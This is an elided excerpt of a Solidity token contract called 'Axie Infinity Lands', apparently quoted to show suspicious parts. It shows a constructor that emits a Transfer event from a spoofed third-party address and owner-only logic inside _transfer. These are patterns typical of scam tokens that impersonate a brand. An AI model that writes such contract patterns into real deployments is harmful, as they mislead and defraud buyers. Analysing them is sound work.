...
contract AxieInfinityLands is Context, IERC20, Ownable {
    ...
    //initial token
    string private _name = 'Axie Infinity Lands';
    ...
    constructor (uint256 amount) {
        ...
        emit Transfer(address(0x01bf1d7C5e192313C26414e134584275F46271cF), _msgSender(), _tTotal);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            uint256 reflectToken = amount.mul(85).div(100);
